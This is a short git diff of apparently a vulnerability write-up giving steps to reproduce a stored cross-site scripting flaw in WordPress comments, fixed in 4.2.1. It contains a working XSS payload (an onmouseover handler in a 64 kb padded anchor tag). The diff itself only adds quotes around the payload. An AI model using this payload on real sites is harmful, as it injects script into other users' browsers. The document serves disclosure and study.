@@ -29,7 +29,7 @@ Fixed in version 4.2.1
 GIF Walkthrough: https://imgur.com/a/t0LrQ
 
 Steps to recreate: 
-- Type <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a> into the comment section on WordPress. The message needs to be at least 64 kb, so you will need to copy paste many 'A' until the message is large enough before submitting.
+- Type "<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>" into the comment section on WordPress. The message needs to be at least 64 kb, so you will need to copy paste many 'A' until the message is large enough before submitting.
 
 Source:https://klikki.fi/adv/wordpress2.html
 
